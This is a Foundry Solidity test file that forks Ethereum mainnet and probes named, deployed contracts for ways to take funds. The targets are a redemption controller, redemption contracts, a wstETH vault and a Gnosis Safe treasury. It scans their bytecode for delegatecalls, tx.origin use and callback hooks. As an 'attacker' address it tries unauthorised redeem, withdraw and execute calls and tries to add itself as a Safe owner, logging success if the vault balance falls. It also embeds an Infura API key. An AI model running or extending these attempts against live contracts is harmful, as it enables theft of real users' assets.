// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

contract RCDelegatecallAnalysis is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRCDelegatecalls() public view {
        console.log("=== ANALYZING RC DELEGATECALLS ===\n");

        bytes memory code = REDEMPTION_CONTROLLER.code;

        // Find all DELEGATECALLs
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                console.log("\nDELEGATECALL at offset:", i);

                // Check context before
                uint start = i > 50 ? i - 50 : 0;

                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x73) {
                        console.log("  PUSH20 at:", j);
                        // Extract address
                        bytes memory addrBytes = new bytes(20);
                        for (uint k = 0; k < 20 && j + 1 + k < code.length; k++) {
                            addrBytes[k] = code[j + 1 + k];
                        }
                        address addr = address(bytes20(addrBytes));
                        console.log("    Address:", addr);
                    }
                }
            }
        }
    }

    function test_AnalyzeRCFunctions() public view {
        console.log("=== ANALYZING RC FUNCTIONS ===\n");

        bytes memory code = REDEMPTION_CONTROLLER.code;

        // Find function selectors
        console.log("RC function selectors:");
        bytes4[] memory uniqueSels = new bytes4[](50);
        uint selCount = 0;

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == 0xffffffff) continue;

                bool isUnique = true;
                for (uint j = 0; j < selCount; j++) {
                    if (uniqueSels[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique && selCount < 50) {
                    uniqueSels[selCount] = sel;
                    selCount++;
                    console.logBytes4(sel);
                }
            }
        }
    }

    function test_TryRCDirectly() public {
        console.log("=== TRYING RC DIRECTLY ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try various RC functions
        console.log("Trying RC functions:");

        (bool s1,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s1);

        (bool s2,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("withdraw(uint256,address)", 100e18, attacker)
        );
        console.log("withdraw(uint256,address):", s2);

        (bool s3,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("execute(address,bytes)", VAULT, abi.encodeWithSignature("withdraw(uint256)", 100e18))
        );
        console.log("execute(address,bytes):", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** RC DIRECTLY EXPLOITED! ***");
        }
    }

    function test_CheckIAUAsERC777() public view {
        console.log("=== CHECKING IF IAU IS ERC777 ===\n");

        // If IAU is ERC777, we might be able to use tokensReceived callback

        bytes memory iauCode = IAU.code;
        console.log("IAU code size:", iauCode.length);

        // Look for ERC777 patterns
        // tokensReceived = 0x0023de29
        // send(address,uint256,bytes) = 0x9bd9bbc6
        // operatorSend = 0x62ad1b83

        bytes4[] memory erc777Sels = new bytes4[](3);
        erc777Sels[0] = bytes4(keccak256("send(address,uint256,bytes)"));
        erc777Sels[1] = bytes4(keccak256("operatorSend(address,address,uint256,bytes,bytes)"));
        erc777Sels[2] = bytes4(keccak256("granularity()"));

        console.log("Searching for ERC777 selectors in IAU:");
        for (uint s = 0; s < erc777Sels.length; s++) {
            console.logBytes4(erc777Sels[s]);
            for (uint i = 0; i + 4 < iauCode.length; i++) {
                if (uint8(iauCode[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(iauCode[i+1], iauCode[i+2], iauCode[i+3], iauCode[i+4]));
                    if (sel == erc777Sels[s]) {
                        console.log("  FOUND at offset:", i);
                    }
                }
            }
        }
    }

    function test_CheckCallbackPatterns() public view {
        console.log("=== CHECKING CALLBACK PATTERNS ===\n");

        // Look for callback patterns in REDEMPTION_0
        // If it calls back to caller or to some address we control...

        bytes memory code = REDEMPTION_0.code;

        // Look for CALLER opcode followed by CALL
        console.log("Looking for CALLER -> CALL patterns:");
        for (uint i = 0; i < code.length - 50; i++) {
            if (uint8(code[i]) == 0x33) { // CALLER
                // Check if there's a CALL within next 50 bytes
                for (uint j = i + 1; j < i + 50 && j < code.length; j++) {
                    if (uint8(code[j]) == 0xf1) { // CALL
                        console.log("  CALLER at", i, "-> CALL at", j);
                        break;
                    }
                }
            }
        }

        // Look for ORIGIN (tx.origin)
        console.log("\nLooking for ORIGIN usage:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x32) { // ORIGIN
                console.log("  ORIGIN at:", i);
            }
        }
    }

    function test_VaultApprovalCheck() public view {
        console.log("=== CHECKING VAULT APPROVALS ===\n");

        // Check what approvals the Vault has given
        console.log("Checking Vault storage for approvals:");

        // ERC20 allowance is typically at keccak256(spender . keccak256(owner . 1))
        // But for Vault, we need to understand its structure

        bytes memory vaultCode = VAULT.code;
        console.log("Vault code size:", vaultCode.length);

        // Check Vault storage
        console.log("\nVault storage slots:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_ExploitViaGnosisSafeCallback() public {
        console.log("=== EXPLOIT VIA GNOSIS SAFE CALLBACK ===\n");

        // The Gnosis Safe (treasury) is stored in REDEMPTION_1
        // If REDEMPTION_1 delegatecalls to Safe for some function,
        // and Safe has a callback pattern...

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling Gnosis Safe functions through REDEMPTION_1
        console.log("Trying Safe functions via REDEMPTION_1:");

        // isOwner(address)
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("isOwner(address)", attacker)
        );
        console.log("isOwner:", s1);
        if (s1 && d1.length >= 32) {
            console.log("  Result:", abi.decode(d1, (bool)));
        }

        // getOwners()
        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("getOwners()")
        );
        console.log("getOwners:", s2);

        // addOwnerWithThreshold(address,uint256) - this would be powerful!
        (bool s3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("addOwnerWithThreshold(address,uint256)", attacker, 1)
        );
        console.log("addOwnerWithThreshold:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** EXPLOIT VIA SAFE CALLBACK WORKED! ***");
        }
    }

    function test_CheckTASSETCallbacks() public view {
        console.log("=== CHECKING TASSET CALLBACKS ===\n");

        // TASSET (tETH) might have callback mechanisms

        bytes memory code = TASSET.code;
        console.log("TASSET code size:", code.length);

        // Look for callback-related selectors
        bytes4[] memory callbackSels = new bytes4[](5);
        callbackSels[0] = bytes4(keccak256("onTokenTransfer(address,uint256,bytes)"));
        callbackSels[1] = bytes4(keccak256("tokenFallback(address,uint256,bytes)"));
        callbackSels[2] = bytes4(keccak256("onERC20Received(address,address,uint256,bytes)"));
        callbackSels[3] = bytes4(keccak256("tokensReceived(address,address,address,uint256,bytes,bytes)"));
        callbackSels[4] = bytes4(keccak256("receiveApproval(address,uint256,address,bytes)"));

        console.log("Searching for callback selectors in TASSET:");
        for (uint s = 0; s < callbackSels.length; s++) {
            for (uint i = 0; i + 4 < code.length; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (sel == callbackSels[s]) {
                        console.log("  Found callback at offset:", i);
                        console.logBytes4(callbackSels[s]);
                    }
                }
            }
        }
    }
}
